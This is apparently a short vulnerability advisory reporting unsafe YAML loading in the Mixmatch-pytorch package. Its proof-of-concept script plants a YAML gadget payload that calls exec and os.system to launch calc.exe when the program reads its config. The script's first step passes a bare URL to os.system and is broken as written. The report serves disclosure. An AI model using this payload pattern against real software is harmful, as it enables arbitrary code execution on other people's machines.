# Description

`Mixmatch-pytorch` is an unofficial implementation of MixMatch with Pytorch. The package is vulnerable to `Arbitary Code Execution` due to insecure yaml desearilization.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

_steps to reproduce:_
```python
import os

os.system('https://github.com/Gooongna/MixMatch-Pytorch-Implementation')
os.chdir('MixMatch-Pytorch-Implementation/')

payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('calc.exe')"
"""

open('config.yml','w+').write(payload)
os.system('python3 main.py 1337')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
